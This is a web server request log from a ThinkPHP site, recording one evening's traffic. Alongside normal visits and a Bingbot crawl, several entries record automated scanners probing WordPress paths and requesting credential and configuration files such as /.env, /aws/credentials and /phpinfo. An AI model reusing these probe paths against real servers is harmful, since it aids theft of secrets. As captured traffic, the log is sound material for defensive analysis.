[ 2023-01-06T16:02:11+08:00 ] 10.0.8.4 207.46.13.44 GET /
[ log ] www.lingdayun.com/ [运行时间：0.084765s][吞吐率：11.80req/s] [内存消耗：1,276.43kb] [文件加载：44]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'host' => 'www.lingdayun.com',
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'from' => 'bingbot(at)microsoft.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'cache-control' => 'no-cache',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T18:50:59+08:00 ] 10.0.8.4 124.71.166.204 GET /
[ log ] www.lingdayun.com/ [运行时间：0.078178s][吞吐率：12.79req/s] [内存消耗：1,276.59kb] [文件加载：44]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'accept-encoding' => 'gzip',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 7.6; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.1237.88 Safari/537.36',
  'accept-language' => 'zh-CN, zh; q=0.9, en; q=0.8, ko; q=0.7',
  'accept' => 'text/html, application/xhtml+xml, application/xml; q=0.9, image/webp; q=0.8',
  'host' => 'www.lingdayun.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T18:50:59+08:00 ] 10.0.8.4 124.71.166.204 GET /index.html
[ log ] www.lingdayun.com/index.html [运行时间：0.072466s][吞吐率：13.80req/s] [内存消耗：1,279.90kb] [文件加载：44]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'accept-encoding' => 'gzip',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 9.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.1504.88 Safari/537.36',
  'accept-language' => 'zh-CN, zh; q=0.9, en; q=0.8, ko; q=0.7',
  'accept' => 'text/html, application/xhtml+xml, application/xml; q=0.9, image/webp; q=0.8',
  'host' => 'www.lingdayun.com',
)
[ info ] [ PARAM ] array (
  '/index_html' => '',
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T21:12:03+08:00 ] 10.0.8.4 206.189.32.216 GET //wp-includes/ID3/license.txt
[ log ] lingdayun.com//wp-includes/ID3/license.txt [运行时间：0.073580s][吞吐率：13.59req/s] [内存消耗：1,112.80kb] [文件加载：40]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'wp-includes',
    1 => 'ID3',
    2 => 'license.txt',
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'accept-language' => 'en-US,en;q=0.5',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
  'connection' => 'close',
  'host' => 'lingdayun.com',
)
[ info ] [ PARAM ] array (
  '/wp-includes/ID3/license_txt' => '',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T21:12:04+08:00 ] 10.0.8.4 206.189.32.216 GET //feed/
[ log ] lingdayun.com//feed/ [运行时间：0.057368s][吞吐率：17.43req/s] [内存消耗：1,112.86kb] [文件加载：40]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'feed',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'accept-language' => 'en-US,en;q=0.5',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
  'cookie' => 'ZDEDebuggerPresent=php,phtml,php3',
  'connection' => 'close',
  'host' => 'lingdayun.com',
)
[ info ] [ PARAM ] array (
  '/feed/' => '',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T21:12:05+08:00 ] 10.0.8.4 206.189.32.216 GET //xmlrpc.php?rsd
[ log ] lingdayun.com//xmlrpc.php?rsd [运行时间：0.068677s][吞吐率：14.56req/s] [内存消耗：1,113.03kb] [文件加载：40]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'xmlrpc.php',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'accept-language' => 'en-US,en;q=0.5',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
  'cookie' => 'ZDEDebuggerPresent=php,phtml,php3',
  'connection' => 'close',
  'host' => 'lingdayun.com',
)
[ info ] [ PARAM ] array (
  '/xmlrpc_php' => '',
  'rsd' => '',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T21:12:06+08:00 ] 10.0.8.4 206.189.32.216 GET //blog/wp-includes/wlwmanifest.xml
[ log ] lingdayun.com//blog/wp-includes/wlwmanifest.xml [运行时间：0.065907s][吞吐率：15.17req/s] [内存消耗：1,113.15kb] [文件加载：40]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'blog',
    1 => 'wp-includes',
    2 => 'wlwmanifest.xml',
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'accept-language' => 'en-US,en;q=0.5',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
  'cookie' => 'ZDEDebuggerPresent=php,phtml,php3',
  'connection' => 'close',
  'host' => 'lingdayun.com',
)
[ info ] [ PARAM ] array (
  '/blog/wp-includes/wlwmanifest_xml' => '',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T21:12:08+08:00 ] 10.0.8.4 206.189.32.216 GET //web/wp-includes/wlwmanifest.xml
[ log ] lingdayun.com//web/wp-includes/wlwmanifest.xml [运行时间：0.069556s][吞吐率：14.38req/s] [内存消耗：1,113.12kb] [文件加载：40]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'web',
    1 => 'wp-includes',
    2 => 'wlwmanifest.xml',
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'accept-language' => 'en-US,en;q=0.5',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
  'cookie' => 'ZDEDebuggerPresent=php,phtml,php3',
  'connection' => 'close',
  'host' => 'lingdayun.com',
)
[ info ] [ PARAM ] array (
  '/web/wp-includes/wlwmanifest_xml' => '',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T21:12:16+08:00 ] 10.0.8.4 206.189.32.216 GET //wordpress/wp-includes/wlwmanifest.xml
[ log ] lingdayun.com//wordpress/wp-includes/wlwmanifest.xml [运行时间：0.059781s][吞吐率：16.73req/s] [内存消耗：1,113.10kb] [文件加载：40]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'wordpress',
    1 => 'wp-includes',
    2 => 'wlwmanifest.xml',
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'accept-language' => 'en-US,en;q=0.5',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
  'cookie' => 'ZDEDebuggerPresent=php,phtml,php3',
  'connection' => 'close',
  'host' => 'lingdayun.com',
)
[ info ] [ PARAM ] array (
  '/wordpress/wp-includes/wlwmanifest_xml' => '',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T21:12:23+08:00 ] 10.0.8.4 206.189.32.216 GET //2020/wp-includes/wlwmanifest.xml
[ log ] lingdayun.com//2020/wp-includes/wlwmanifest.xml [运行时间：0.058478s][吞吐率：17.10req/s] [内存消耗：1,113.15kb] [文件加载：40]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '2020',
    1 => 'wp-includes',
    2 => 'wlwmanifest.xml',
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'accept-language' => 'en-US,en;q=0.5',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
  'cookie' => 'ZDEDebuggerPresent=php,phtml,php3',
  'connection' => 'close',
  'host' => 'lingdayun.com',
)
[ info ] [ PARAM ] array (
  '/2020/wp-includes/wlwmanifest_xml' => '',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T21:12:30+08:00 ] 10.0.8.4 206.189.32.216 GET //2021/wp-includes/wlwmanifest.xml
[ log ] lingdayun.com//2021/wp-includes/wlwmanifest.xml [运行时间：0.058992s][吞吐率：16.95req/s] [内存消耗：1,113.15kb] [文件加载：40]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '2021',
    1 => 'wp-includes',
    2 => 'wlwmanifest.xml',
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'accept-language' => 'en-US,en;q=0.5',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
  'cookie' => 'ZDEDebuggerPresent=php,phtml,php3',
  'connection' => 'close',
  'host' => 'lingdayun.com',
)
[ info ] [ PARAM ] array (
  '/2021/wp-includes/wlwmanifest_xml' => '',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T21:12:32+08:00 ] 10.0.8.4 206.189.32.216 GET //shop/wp-includes/wlwmanifest.xml
[ log ] lingdayun.com//shop/wp-includes/wlwmanifest.xml [运行时间：0.065356s][吞吐率：15.30req/s] [内存消耗：1,113.15kb] [文件加载：40]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'shop',
    1 => 'wp-includes',
    2 => 'wlwmanifest.xml',
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'accept-language' => 'en-US,en;q=0.5',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
  'cookie' => 'ZDEDebuggerPresent=php,phtml,php3',
  'connection' => 'close',
  'host' => 'lingdayun.com',
)
[ info ] [ PARAM ] array (
  '/shop/wp-includes/wlwmanifest_xml' => '',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T21:12:33+08:00 ] 10.0.8.4 206.189.32.216 GET //wp1/wp-includes/wlwmanifest.xml
[ log ] lingdayun.com//wp1/wp-includes/wlwmanifest.xml [运行时间：0.061974s][吞吐率：16.14req/s] [内存消耗：1,113.12kb] [文件加载：40]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'wp1',
    1 => 'wp-includes',
    2 => 'wlwmanifest.xml',
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'accept-language' => 'en-US,en;q=0.5',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
  'cookie' => 'ZDEDebuggerPresent=php,phtml,php3',
  'connection' => 'close',
  'host' => 'lingdayun.com',
)
[ info ] [ PARAM ] array (
  '/wp1/wp-includes/wlwmanifest_xml' => '',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T21:12:35+08:00 ] 10.0.8.4 206.189.32.216 GET //test/wp-includes/wlwmanifest.xml
[ log ] lingdayun.com//test/wp-includes/wlwmanifest.xml [运行时间：0.062089s][吞吐率：16.11req/s] [内存消耗：1,113.15kb] [文件加载：40]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'test',
    1 => 'wp-includes',
    2 => 'wlwmanifest.xml',
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'accept-language' => 'en-US,en;q=0.5',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
  'cookie' => 'ZDEDebuggerPresent=php,phtml,php3',
  'connection' => 'close',
  'host' => 'lingdayun.com',
)
[ info ] [ PARAM ] array (
  '/test/wp-includes/wlwmanifest_xml' => '',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T21:12:37+08:00 ] 10.0.8.4 206.189.32.216 GET //site/wp-includes/wlwmanifest.xml
[ log ] lingdayun.com//site/wp-includes/wlwmanifest.xml [运行时间：0.061273s][吞吐率：16.32req/s] [内存消耗：1,113.15kb] [文件加载：40]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'site',
    1 => 'wp-includes',
    2 => 'wlwmanifest.xml',
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'accept-language' => 'en-US,en;q=0.5',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
  'cookie' => 'ZDEDebuggerPresent=php,phtml,php3',
  'connection' => 'close',
  'host' => 'lingdayun.com',
)
[ info ] [ PARAM ] array (
  '/site/wp-includes/wlwmanifest_xml' => '',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T21:12:38+08:00 ] 10.0.8.4 206.189.32.216 GET //cms/wp-includes/wlwmanifest.xml
[ log ] lingdayun.com//cms/wp-includes/wlwmanifest.xml [运行时间：0.066439s][吞吐率：15.05req/s] [内存消耗：1,113.12kb] [文件加载：40]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'cms',
    1 => 'wp-includes',
    2 => 'wlwmanifest.xml',
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'accept-language' => 'en-US,en;q=0.5',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
  'cookie' => 'ZDEDebuggerPresent=php,phtml,php3',
  'connection' => 'close',
  'host' => 'lingdayun.com',
)
[ info ] [ PARAM ] array (
  '/cms/wp-includes/wlwmanifest_xml' => '',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T21:45:39+08:00 ] 10.0.8.4 109.237.98.53 GET /.env
[ log ] lingdayun.com/.env [运行时间：0.065533s][吞吐率：15.26req/s] [内存消耗：1,112.48kb] [文件加载：40]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '.env',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36',
  'host' => 'lingdayun.com',
)
[ info ] [ PARAM ] array (
  '/_env' => '',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T21:50:36+08:00 ] 10.0.8.4 220.196.160.76 GET /aws/credentials
[ log ] lingdayun.com/aws/credentials [运行时间：0.057833s][吞吐率：17.29req/s] [内存消耗：1,114.05kb] [文件加载：40]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'aws',
    1 => 'credentials',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'x-forwarded-for' => '82.157.249.182',
  'upgrade-insecure-requests' => '1',
  'referer' => 'http://lingdayun.com/aws/credentials',
  'connection' => 'close',
  'cache-control' => 'max-age=0',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'accept-encoding' => 'gzip, deflate',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'user-agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36',
  'host' => 'lingdayun.com',
)
[ info ] [ PARAM ] array (
  '/aws/credentials' => '',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T21:53:21+08:00 ] 10.0.8.4 180.101.245.248 GET /credentials
[ log ] lingdayun.com/credentials [运行时间：0.063301s][吞吐率：15.80req/s] [内存消耗：1,114.04kb] [文件加载：40]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'credentials',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'x-forwarded-for' => '82.157.249.182',
  'upgrade-insecure-requests' => '1',
  'referer' => 'http://lingdayun.com/credentials',
  'connection' => 'close',
  'cache-control' => 'max-age=0',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'accept-encoding' => 'gzip, deflate',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'user-agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36',
  'host' => 'lingdayun.com',
)
[ info ] [ PARAM ] array (
  '/credentials' => '',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T21:55:39+08:00 ] 10.0.8.4 220.196.160.95 GET /test.php
[ log ] lingdayun.com/test.php [运行时间：0.060359s][吞吐率：16.57req/s] [内存消耗：1,113.95kb] [文件加载：40]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'test.php',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'x-forwarded-for' => '82.157.249.182',
  'upgrade-insecure-requests' => '1',
  'referer' => 'http://lingdayun.com/test.php',
  'connection' => 'close',
  'cache-control' => 'max-age=0',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'accept-encoding' => 'gzip, deflate',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'user-agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36',
  'host' => 'lingdayun.com',
)
[ info ] [ PARAM ] array (
  '/test_php' => '',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T21:55:53+08:00 ] 10.0.8.4 220.196.160.45 GET /phpinfo
[ log ] lingdayun.com/phpinfo [运行时间：0.064645s][吞吐率：15.47req/s] [内存消耗：1,113.91kb] [文件加载：40]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'phpinfo',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'x-forwarded-for' => '82.157.249.182',
  'upgrade-insecure-requests' => '1',
  'referer' => 'http://lingdayun.com/phpinfo',
  'connection' => 'close',
  'cache-control' => 'max-age=0',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'accept-encoding' => 'gzip, deflate',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'user-agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36',
  'host' => 'lingdayun.com',
)
[ info ] [ PARAM ] array (
  '/phpinfo' => '',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T22:15:56+08:00 ] 10.0.8.4 223.72.60.198 GET /
[ log ] www.lingdayun.com/ [运行时间：0.073139s][吞吐率：13.67req/s] [内存消耗：1,277.97kb] [文件加载：44]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'host' => 'www.lingdayun.com',
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
  'accept-encoding' => 'gzip, deflate, br',
  'sec-ch-ua-platform' => '"Windows"',
  'sec-ch-ua-mobile' => '?0',
  'sec-ch-ua' => '"Not?A_Brand";v="8", "Chromium";v="108", "Microsoft Edge";v="108"',
  'sec-fetch-dest' => 'document',
  'sec-fetch-user' => '?1',
  'sec-fetch-mode' => 'navigate',
  'sec-fetch-site' => 'cross-site',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.42',
  'upgrade-insecure-requests' => '1',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T22:16:33+08:00 ] 10.0.8.4 223.72.60.198 GET /
[ log ] www.lingdayun.com/ [运行时间：0.071953s][吞吐率：13.90req/s] [内存消耗：1,278.32kb] [文件加载：44]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'host' => 'www.lingdayun.com',
  'cookie' => 'ZDEDebuggerPresent=php,phtml,php3',
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
  'accept-encoding' => 'gzip, deflate, br',
  'sec-fetch-dest' => 'document',
  'sec-fetch-user' => '?1',
  'sec-fetch-mode' => 'navigate',
  'sec-fetch-site' => 'cross-site',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.42',
  'upgrade-insecure-requests' => '1',
  'sec-ch-ua-platform' => '"Windows"',
  'sec-ch-ua-mobile' => '?0',
  'sec-ch-ua' => '"Not?A_Brand";v="8", "Chromium";v="108", "Microsoft Edge";v="108"',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T22:16:33+08:00 ] 10.0.8.4 223.72.60.198 GET /
[ log ] www.lingdayun.com/ [运行时间：0.070950s][吞吐率：14.09req/s] [内存消耗：1,278.32kb] [文件加载：44]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'host' => 'www.lingdayun.com',
  'cookie' => 'ZDEDebuggerPresent=php,phtml,php3',
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
  'accept-encoding' => 'gzip, deflate, br',
  'sec-fetch-dest' => 'document',
  'sec-fetch-user' => '?1',
  'sec-fetch-mode' => 'navigate',
  'sec-fetch-site' => 'cross-site',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.42',
  'upgrade-insecure-requests' => '1',
  'sec-ch-ua-platform' => '"Windows"',
  'sec-ch-ua-mobile' => '?0',
  'sec-ch-ua' => '"Not?A_Brand";v="8", "Chromium";v="108", "Microsoft Edge";v="108"',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T22:19:40+08:00 ] 10.0.8.4 121.24.179.122 GET /
